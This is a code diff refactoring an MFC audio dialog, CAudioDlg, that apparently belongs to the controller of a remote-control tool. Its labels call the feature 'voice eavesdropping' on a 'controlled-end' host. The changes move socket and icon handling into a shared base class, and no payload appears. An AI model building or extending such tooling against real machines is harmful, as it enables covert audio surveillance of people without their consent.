@@ -12,22 +12,14 @@
 IMPLEMENT_DYNAMIC(CAudioDlg, CDialog)
 
 CAudioDlg::CAudioDlg(CWnd* pParent, IOCPServer* IOCPServer, CONTEXT_OBJECT *ContextObject)
-: CDialog(CAudioDlg::IDD, pParent)
+: DialogBase(CAudioDlg::IDD, pParent, IOCPServer, ContextObject, IDI_ICON_AUDIO)
 	, m_bSend(FALSE)
 {
-	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_AUDIO));  //处理图标
 	m_bIsWorking	= TRUE;
 	m_bThreadRun	= FALSE;
-	m_iocpServer	= IOCPServer;       //为类的成员变量赋值
-	m_ContextObject		= ContextObject;
+
 	m_hWorkThread  = NULL;
 	m_nTotalRecvBytes = 0;
-	sockaddr_in  ClientAddress;
-	memset(&ClientAddress, 0, sizeof(ClientAddress));        //得到被控端ip
-	int iClientAddressLen = sizeof(ClientAddress);
-	BOOL bResult = getpeername(m_ContextObject->sClientSocket,(SOCKADDR*)&ClientAddress, &iClientAddressLen);
-
-	m_strIPAddress = bResult != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "";
 }
 
 CAudioDlg::~CAudioDlg()
@@ -60,7 +52,7 @@ BOOL CAudioDlg::OnInitDialog()
 	SetIcon(m_hIcon,FALSE);
 
 	CString strString;
-	strString.Format("%s - 语音监听", m_strIPAddress);
+	strString.Format("%s - 语音监听", m_IPAddress);
 	SetWindowText(strString);
 
 	BYTE bToken = COMMAND_NEXT;
@@ -122,19 +114,11 @@ void CAudioDlg::OnReceiveComplete(void)
 
 void CAudioDlg::OnClose()
 {
-	// TODO: 在此添加消息处理程序代码和/或调用默认值
-#if CLOSE_DELETE_DLG
-	m_ContextObject->v1 = 0;
-#endif
-	CancelIo((HANDLE)m_ContextObject->sClientSocket);
-	closesocket(m_ContextObject->sClientSocket);
+	CancelIO();
 
 	m_bIsWorking = FALSE;
 	WaitForSingleObject(m_hWorkThread, INFINITE);
-	CDialog::OnClose();
-#if CLOSE_DELETE_DLG
-	delete this;
-#endif
+	DialogBase::OnClose();
 }
 
 // 处理是否发送本地语音到远程
